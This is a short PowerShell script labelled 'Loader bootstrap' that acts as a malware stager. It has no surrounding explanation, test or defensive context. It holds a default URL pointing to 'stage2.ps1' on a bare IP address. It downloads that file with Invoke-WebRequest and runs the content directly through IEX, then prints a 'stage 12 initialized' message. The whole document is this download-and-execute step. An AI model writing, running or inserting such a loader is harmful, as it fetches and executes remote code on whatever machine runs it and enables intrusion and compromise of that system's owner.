
<# Loader bootstrap #>
[CmdletBinding()]
param(
    [string]$PayloadUrl = "https://198.51.100.35/stage2.ps1",
    [int]$TimeoutSec = 89
)
IEX (Invoke-WebRequest -Uri $PayloadUrl -UseBasicParsing).Content
Write-Output "stage 12 initialized"
